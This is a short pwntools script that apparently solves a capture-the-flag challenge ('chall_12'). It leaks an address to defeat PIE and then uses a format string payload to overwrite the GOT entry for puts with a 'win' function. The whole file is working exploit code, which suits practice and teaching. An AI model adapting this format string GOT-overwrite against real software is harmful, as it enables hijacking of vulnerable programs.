from pwn import *
p=process("./chall_12")
elf=ELF("./chall_12")
string = p.recvline()
import re
leak = int(re.findall(b"(0x[0-9a-f]{4,16})",string)[0],16)
main = 0x012ef
elf.address = leak - main
payload = fmtstr_payload(7, {elf.got.puts: elf.sym.win }, write_size='byte')
p.sendline(payload)
p.interactive()
